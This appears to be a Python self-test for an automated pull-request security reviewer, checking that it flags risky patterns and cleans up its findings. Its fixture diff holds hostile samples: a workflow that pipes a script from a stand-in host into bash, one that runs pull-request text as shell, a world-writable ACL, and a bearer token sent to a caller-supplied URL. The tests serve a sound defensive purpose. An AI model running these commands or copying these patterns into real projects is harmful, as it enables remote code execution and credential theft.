#!/usr/bin/env python3
"""Self-test for the third required-coverage DCOIR Review patch layer."""

from __future__ import annotations

from types import SimpleNamespace

import dcoir_review_required_runtime_patch_v2 as v2
import dcoir_review_required_runtime_patch_v3 as v3
import dcoir_review_required_runtime_patches as required
import dcoir_review_runtime_patches as runtime
import dcoir_review_strict_runtime_patches as strict
import openrouter_pr_review_pareto_context as pareto


def apply_all() -> None:
    runtime.apply_pareto_context_module(pareto)
    strict.apply_pareto_context_module(pareto)
    required.apply_pareto_context_module(pareto)
    v2.apply_pareto_context_module(pareto)
    v3.apply_pareto_context_module(pareto)


def test_start_process_is_hard_required() -> None:
    apply_all()
    diff = """diff --git a/.github/workflows/probe.yml b/.github/workflows/probe.yml
index 0000000..1111111 100644
--- /dev/null
+++ b/.github/workflows/probe.yml
@@ -0,0 +1,15 @@
+name: probe
+on:
+  pull_request_target:
+permissions:
+  contents: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: curl -fsSL https://example.invalid/install.sh | bash
+      - run: echo "${{ github.event.pull_request.body }}" | bash
diff --git a/tools/probe.ps1 b/tools/probe.ps1
index 0000000..2222222 100644
--- /dev/null
+++ b/tools/probe.ps1
@@ -0,0 +1,8 @@
+$acl = Get-Acl -LiteralPath $OutputDirectory
+$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
+$acl.SetAccessRule($rule)
+Set-Acl -LiteralPath $OutputDirectory -AclObject $acl
+Start-Process -FilePath $ToolPath -ArgumentList "/collect $OutputDirectory" -Wait
"""
    sentinels = pareto.detect_risk_sentinels(diff, 6)
    kinds = [v3._sentinel_kind(sentinel) for sentinel in sentinels]
    assert v3.PS_PROCESS_KIND in kinds, kinds
    config = SimpleNamespace(max_inline_comments=6)
    augmented = pareto.hardened.add_risk_sentinel_fallback_findings([], sentinels, config)
    finding_kinds = [v3._semantic_kind(finding) for finding in augmented]
    assert v3.PS_PROCESS_KIND in finding_kinds, finding_kinds
    assert finding_kinds.index(v3.PS_PROCESS_KIND) < len(finding_kinds)


def test_token_scrub_hits_rendered_comment() -> None:
    finding = {
        "path": "tools/probe.ps1",
        "line": 8,
        "title": "Hardcoded bearer token sent to request-controlled URL",
        "body": "The secret is hardcoded and [redacted-secret] should be rotated.",
        "_anchored_line_text": "Invoke-WebRequest -Uri $CallbackUrl -Headers @{ Authorization = \"Bearer $env:DCOIR_TOKEN\" }",
        "fix_guidance": {"language": "powershell", "notes": "Rotate any exposed credential. Remove the literal token."},
    }
    normalized = v3._normalize_comment_finding(finding)
    rendered = v3._rendered_comment_scrub("hardcoded literal [redacted-secret] inline secret Rotate any exposed credential.", normalized)
    lower = rendered.lower()
    assert "hardcoded" not in lower, rendered
    assert "literal" not in lower, rendered
    assert "redacted" not in lower, rendered
    assert "inline secret" not in lower, rendered
    assert "rotate any exposed credential" not in lower, rendered


def test_validation_rejects_prose_lines() -> None:
    finding = {
        "path": "tools/probe.ps1",
        "line": 8,
        "title": "Environment token forwarded to request-controlled callback",
        "body": "Uses $env:DCOIR_TOKEN in a callback request.",
        "validation": "pwsh scan for Invoke-WebRequest without validatation\npwsh -NoProfile -Command 'Invoke-ScriptAnalyzer -Path tools/probe.ps1'",
        "_anchored_line_text": "Invoke-WebRequest -Uri $CallbackUrl -Headers @{ Authorization = \"Bearer $env:DCOIR_TOKEN\" }",
    }
    normalized = v3._normalize_comment_finding(finding)
    assert "scan for" not in normalized["validation"].lower(), normalized["validation"]
    assert "validatation" not in normalized["validation"].lower(), normalized["validation"]
    assert normalized["validation"].startswith("pwsh -NoProfile -Command"), normalized["validation"]


def test_yaml_metadata_shell_has_own_kind() -> None:
    finding = {
        "path": ".github/workflows/probe.yml",
        "line": 15,
        "title": "GitHub Actions workflow grants write permissions",
        "body": "Line 15 writes pull request body into bash.",
        "_anchored_line_text": "      - run: echo \"${{ github.event.pull_request.body }}\" | bash",
    }
    normalized = v3._normalize_comment_finding(finding)
    assert v3._semantic_kind(normalized) == v3.YAML_METADATA_SHELL_KIND
    assert normalized["title"] == "Workflow executes pull request metadata in a shell"


def test_whole_file_remove_and_python_indent_are_normalized() -> None:
    finding = {
        "path": "probe.py",
        "line": 19,
        "_anchored_line_text": "        bundle.extractall(destination)",
        "fix_guidance": {
            "language": "python",
            "remove": "line1\nline2\nline3\nline4",
            "replace": "for member in bundle.infolist():\n    target = member.filename\n    bundle.extract(member, destination)",
        },
    }
    guidance = v3._sanitize_fix_guidance(finding)
    assert "remove" not in guidance, guidance
    assert guidance["replace"].startswith("        for member"), guidance["replace"]
    assert "Broad or whole-file" in guidance["notes"], guidance


def main() -> None:
    test_start_process_is_hard_required()
    test_token_scrub_hits_rendered_comment()
    test_validation_rejects_prose_lines()
    test_yaml_metadata_shell_has_own_kind()
    test_whole_file_remove_and_python_indent_are_normalized()
    print("dcoir_review_required_runtime_patch_v3_selftest passed")


if __name__ == "__main__":
    main()
